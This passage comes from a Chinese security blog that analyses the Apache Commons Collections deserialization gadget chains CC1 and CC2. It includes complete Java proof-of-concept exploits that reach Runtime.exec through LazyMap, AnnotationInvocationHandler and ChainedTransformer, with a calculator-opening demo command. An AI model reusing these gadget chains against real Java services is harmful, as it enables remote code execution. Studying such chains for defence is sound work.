class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(proxyMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>但运行后，经过反序列化并不会执行命令弹出计算器。断点调试一下，发现<code>memberValues</code>变量的赋值为<code>LazyMap</code><br><img src="images/image-20220926111006320.png" alt="image-20220926111006320"></p><p>因此在经过<code>this.memberValues.entrySet().iterator();</code>步入到<code>var4.next()</code>执行方法时，无法进入<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法<br><img src="images/image-20220926111405695.png" alt="image-20220926111405695"></p><p>所以我们需要再创建一次<code>AnnotationInvocationHandler</code>，触发我们前面的代理对象，最终 POC如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220926150336993.png" alt="image-20220926150336993"></p><p>通过把前面的<code>proxyMap</code>作为构造方法的参数传入，此时的<code>memberValues</code>为我们的代理对象<code>proxyMap</code>，也就是<code>AnnotationInvocationHandler</code>实例<br><img src="images/image-20220926150831689.png" alt="image-20220926150831689"></p><p>经过<code>this.memberValues.entrySet()</code>步入到<code>var4.next()</code>之后，成功进入到被代理的<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法中。</p><p>此时的<code>memberValues</code>参数值就是前面第一次代理的时候的<code>LazyMap</code>，因此可以调用到<code>LazyMap.get()</code>方法，触发命令执行。<br><img src="images/image-20220926151146196.png" alt="image-20220926151146196"></p><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>在前面调试的时候，在未进入<code>readObject()</code>反序列化方法时，就弹出了计算器，原因是在第一次代理了<code>map</code>对象后，在执行<code>map</code>类的任意方法都会触发构造的<code>payload</code>，而由于<code>IDEA</code>中<code>Debug</code>的过程中会调用到代理类的<code>toString</code>方法从而造成非预期的命令执行。</p><p>解决方案是取消掉这两处的✅<br><img src="images/image-20220926151832327.png" alt="image-20220926151832327"></p><p>当前也可以参照<code>ysoserial</code>的处理<br><img src="images/image-20221005001535438.png" alt="image-20221005001535438"></p><p>先在开头设置一个没有危害的对象，在最后进行序列化的时候再把真正具有危害的<code>transformers</code>数组替换，从而避免了非预期的 rce<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections2利用链分析</title>
      <link href="/2022/11/10/CommonsCollections2/"/>
      <url>/2022/11/10/CommonsCollections2/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections2利用链分析"><a href="#CommonsCollections2利用链分析" class="headerlink" title="CommonsCollections2利用链分析"></a>CommonsCollections2利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections2</code>利用链利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 4.0</span><br><span class="line">JDK 版本暂无限制</span><br><span class="line">需要 javassist(伪条件，具体见下文)</span><br></pre></td></tr></table></figure><p>可以看到，在 cc2 是针对<code>CommonsCollections 4.0</code>新版本的利用链，环境配置 Maven 依赖如下（需要 javassist 的原因在下文）：<br><img src="images/image-20221009105637369.png" alt="image-20221009105637369"></p><p>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>我们就跟着链子逐步探究一番。</p><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>看<code>PriorityQueue#readObject()</code>方法源码<br><img src="images/image-20221009112426049.png" alt="image-20221009112426049"></p><p>可以看到对传入的对象输入流<code>s</code>进行反序列化并传入到<code>queue</code>数组中，说明<code>s</code>是经过序列化后的数据，那么接着看<code>writeObject()</code>序列化方法<br><img src="images/image-20221009112818375.png" alt="image-20221009112818375"></p><p>其中对<code>queue</code>数组遍历进行序列化，而<code>queue</code>是<code>PriorityQueue</code>类的一个属性，那么我们可以通过反射进行控制，所以<code>queue</code>成为可控点。<br><img src="images/image-20221009112947079.png" alt="image-20221009112947079"></p><p>前面可以看到<code>readObject()</code>方法最后还调用了<code>heapify()</code>方法，我们接着跟<code>heapify()</code><br><img src="images/image-20221009113211379.png" alt="image-20221009113211379"></p><p><code>headify()</code>方法进行循环并调用了<code>siftDown()</code>方法，其中第二个参数<code>queue</code>是可控点，继续跟进<code>siftDown()</code>源码<br><img src="images/image-20221009113328581.png" alt="image-20221009113328581"></p><p>这里做了一个判断，如果<code>comparator</code>不为空，则进入<code>siftDownUsingComparator(k, x)</code>方法。<br><img src="images/image-20221009113434631.png" alt="image-20221009113434631"></p><p>这里<code>comparator</code>也是<code>PriorityQueue</code>类的一个属性，因此也可以通过反射进行控制。此外，因为前面的<code>queue</code>是可控的，所以这里<code>siftDownUsingComparator(k, x)</code>的<code>x</code>也是可控的。</p><p>继续跟进<code>siftDownUsingComparator()</code>方法源码<br><img src="images/image-20221009113836865.png" alt="image-20221009113836865"></p><p>可以看到这里调用到了<code>comparator.compare()</code>方法，而<code>comparator</code>是可控的，并且<code>comparator(x,c)</code>中的<code>x</code>也是可控的。</p><p>根据利用链可以看到<code>comparator</code>被赋值为<code>TransformingComparator</code>，接下来到了<code>TransformingComparator.compare()</code>方法。</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><p>跟进<code>TransformingComparator#compare()</code>方法<br><img src="images/image-20221009120104239.png" alt="image-20221009120104239"></p><p>可以看到会执行<code>this.transformer.transform()</code>方法，并且<code>this.transformer</code>在前面构造参数方法的时候进行赋值，因此也是可控点。这里可以根据前面学习的<code>CommonsCollections1</code>开始构造 POC 了。</p><p>在构造 POC 前，发现<code>ysoserial</code>中的<code>queue</code>添加了两个元素<br><img src="images/image-20221009121010160.png" alt="image-20221009121010160"></p><p>这是为啥捏？回去重新跟一下，发现原来是要满足在<code>heapify()</code>方法的操作，如果只有一个元素则<code>size</code>为 1，最后经过无符号右移动 1 位并且减 1 ，则结果为 -1 将无法进入<code>siftDown()</code>方法<br><img src="images/image-20221009121552839.png" alt="image-20221009121552839"></p><p>补充一下，<code>TransformingComparator</code>类只有在<code>CommonsCollections4.0</code>的时候才实现<code>serializable</code>接口，因此才可以进行序列化与反序列化。<br><img src="images/image-20221012154454936.png" alt="image-20221012154454936"></p><p>这也是为什么<code>CommonsCollections2</code>限制了利用版本在<code>CommonsCollections4.0</code>的原因。</p><h2 id="构造-POC"><a href="#构造-POC" class="headerlink" title="构造 POC"></a>构造 POC</h2><p>根据以上学习，利用链已经清晰明了，构造 POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 